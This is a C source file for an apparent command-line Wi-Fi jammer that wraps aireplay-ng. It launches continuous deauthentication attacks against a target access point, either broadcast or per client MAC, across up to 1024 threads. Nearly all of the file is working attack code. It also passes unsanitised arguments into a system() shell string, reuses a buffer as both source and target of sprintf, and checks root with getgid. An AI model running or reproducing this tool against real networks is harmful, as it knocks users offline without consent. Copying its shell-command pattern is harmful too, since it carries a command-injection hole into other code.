/**CFile***********************************************************************

  FileName    [airjammer.c]

  PackageName [Aircrack-CLI]

  Synopsis    [Aircrack Command Line Interface - AirJammer]

  Description [Command Line Interface for Aircrack-ng 
  (credits to Thomas d'Otreppe <tdotreppe@aircrack-ng.org>)]

  Author      [ynad]

  License     [GPLv2, see LICENSE.md]
  
  Revision    [1.1.7, 2014-01-18]

******************************************************************************/


#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>

//Library functions header
#include "lib.h"

#define MAXTHREAD 1024

//Local functions prototypes
static void *jammer();
static void sigHandler(int);
static void printSyntax(char *);

//error variable
//xextern int errno;

//General variables
static char *bssid;
static char *mon;
static maclist_t *maclst;


int main (int argc, char *argv[])
{
	int i, dim, ris;
	pthread_t tid;

	//set signal handler for SIGINT (Ctrl-C)
	signal(SIGINT, sigHandler);

	//syntax
	if (argc < 3) {
		printSyntax(argv[0]);
		return (EXIT_FAILURE);
	}

	//check execution permissions
    if (getgid() != 0) {
        fprintf(stderr, "Run it as root!\n");
		return (EXIT_FAILURE);
    }
	//check BSSID
	if (checkMac(argv[1]) == FALSE) {
		fprintf(stderr, "Error: wrong format for BSSID (%s).\n", argv[1]);
		return (EXIT_FAILURE);
	}
	//check monitor
	if (checkMon(argv[2]) == EXIT_FAILURE)
		return (EXIT_FAILURE);

	//setting up variables
	bssid = argv[1];
	mon = argv[2];
	setbuf(stdout, NULL);

	//launch broadcast deauth in single thread if specified from arguments
	if (argc == 3) {
		jammer(NULL);
	}
	else {
		dim = 0;
		//reading MACs list
		if ((maclst = freadMaclist(argv[3])) == NULL)
			return (EXIT_FAILURE);
		if ((dim = getDim(maclst)) == 0) {
			fprintf(stderr, "\nError: file empty o wrong content!\n");
			freeMem(maclst);
			return (EXIT_FAILURE);
		}
		//creation of threads
  		if (dim <= MAXTHREAD)
			fprintf(stdout, "\tStarting %d deauths:\n", dim);
		else
			fprintf(stdout, "\tStarting %d (max. allowed) deauths out of %d requested:\n", MAXTHREAD, dim);
		for (i=0; i<dim && i<MAXTHREAD; i++) {
			ris = pthread_create(&tid, NULL, jammer, (void *) getMac(maclst, i));
			if (ris) {
				fprintf(stderr, "Error creating thread %d (%d): %s\n", i, ris, strerror(errno));
				return (EXIT_FAILURE);
			}
		}
		pause();
	}

	pthread_exit(NULL);
}


/* Thread target function */
static void *jammer(void *mac)
{
	char *addr;
	char death[BUFF]={"aireplay-ng --deauth 0 -a"};

	//broadcast deauth
	if (mac == NULL)
		sprintf(death, "%s %s %s --ignore-negative-one", death, bssid, mon);
	//single MAC deauth
	else {
		addr = (char *)mac;
		sprintf(death, "%s %s -c %s %s --ignore-negative-one", death, bssid, addr, mon);
	}
	system(death);

	if (mac == NULL)
		return NULL;
	pthread_exit(NULL);
}


/* Signal handler */
static void sigHandler(int sig)
{
	if (sig == SIGINT)
		fprintf(stderr, "\nReceived signal SIGINT (%d): exiting.\n", sig);
	else
		fprintf(stderr, "\nReceived signal %d: exiting.\n", sig);

	//free and exit
	freeMem(maclst);
	exit(EXIT_FAILURE);
}


/* Prints program syntax */
static void printSyntax(char *name)
{
	fprintf(stderr, "Argument error. Syntax:\n   %s [BSSID] [MONITOR-IF] <MAC-LIST-FILE>\n", name);
	fprintf(stderr, "\t[BSSID]\t\t  identifier of network target\n\t[MONITOR-IF]\t  wireless interface in monitor mode\n\t<MAC-LIST-FILE>\t  if omitted starts broadcast jammer\n");
}

